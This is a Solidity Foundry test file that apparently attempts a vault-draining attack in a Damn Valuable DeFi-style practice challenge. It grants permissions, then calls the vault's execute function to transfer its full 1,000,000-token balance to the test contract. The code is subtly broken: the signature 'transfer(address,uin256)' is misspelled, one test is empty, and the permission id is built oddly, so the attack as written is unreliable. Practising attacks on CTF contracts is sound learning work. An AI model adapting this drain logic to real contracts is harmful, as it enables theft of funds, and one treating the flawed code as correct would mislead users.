// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {AuthorizedExecutor} from "../src/AuthorizedExecutor.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

import {UtilsTest} from "./Utils.t.sol";

contract SelfAuthorizedVaultTest is UtilsTest {
    bytes32[] ids = new bytes32[](1);
    address attackerAddress = makeAddr("attacker Address");
    function setUp() public override {
        super.setUp();

        ids[0] = keccak256(
            abi.encode(
                bytes4(keccak256("transfer(address,uint256)")), // 4-byte selector
                attackerAddress,
                attacker
            )
        );
    }

    function test_vaultFunds() public {
        token.balanceOf(address(vault));

        assertEq(token.balanceOf(address(vault)), 1000000 ether);
        assertEq(token.balanceOf(address(token)), 0 ether);
    }

    function test_setPermission() public {}

    function test_Attack() public {
        vault.setPermissions(ids);
        bytes memory actionData = abi.encodeWithSignature(
            "transfer(address,uin256)",
            address(this),
            1000000 ether
        );

        vault.execute(address(attacker), actionData);
    }
}
